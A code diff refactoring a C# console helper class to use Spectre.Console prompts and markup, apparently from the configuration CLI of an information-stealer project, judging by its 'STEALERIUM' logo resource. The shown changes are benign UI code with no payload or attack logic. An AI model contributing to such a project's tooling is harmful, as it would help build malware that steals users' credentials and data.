@@ -7,16 +7,19 @@ internal sealed class Cli
 {
     public static string GetBoolValue(string text)
     {
-        Console.Write("(?) " + text + " (y/n): ");
-        Console.ForegroundColor = ConsoleColor.White;
-        var result = Console.ReadLine();
-        return result != null && result.ToUpper() == "Y" ? "1" : "0";
+        var prompt = new TextPrompt<string>($"[bold yellow](?)[/] {text} [white](y/n):[/]")
+            .AllowEmpty();
+
+        string result = AnsiConsole.Prompt(prompt);
+        return result.ToUpper() == "Y" ? "1" : "0";
     }
 
     public static string? GetStringValue(string text)
     {
-        AnsiConsole.Write(new Markup("[bold yellow](?)[/] [red]" + text + "[/] \n>>> "));
-        return Console.ReadLine();
+        var prompt = new TextPrompt<string>($"[bold yellow](?)[/] [red]{text}[/]\n>>> ")
+            .AllowEmpty();
+
+        return AnsiConsole.Prompt(prompt);
     }
 
     public static string GetEncryptedString(string text)
@@ -27,25 +30,25 @@ internal sealed class Cli
 
     public static void ShowError(string text)
     {
-        AnsiConsole.Write(new Markup("[red] (!) " + text + "\n Press any key to exit...[/]"));
+        AnsiConsole.MarkupLine("[red](!) {0}[/]", text);
+        AnsiConsole.Write(new Markup("Press any key to exit..."));
         Console.ReadKey();
         Environment.Exit(1);
     }
 
     public static void ShowInfo(string text)
     {
-        AnsiConsole.Write(new Markup("[yellow] (i) " + text + "[/]"));
+        AnsiConsole.MarkupLine("[yellow](i) {0}[/]", text);
     }
 
     public static void ShowSuccess(string text)
     {
-        AnsiConsole.Write(new Markup("[green] (+) " + text + "[/]"));
+        AnsiConsole.MarkupLine("[green](+) {0}[/]", text);
     }
 
     public static void ShowLogo()
     {
-        var image = new CanvasImage(Properties.Resources.STEALERİUM);
-        // Render the image to the console
+        var image = new CanvasImage(Properties.Resources.STEALERIUM);
         AnsiConsole.Write(image);
     }
 }
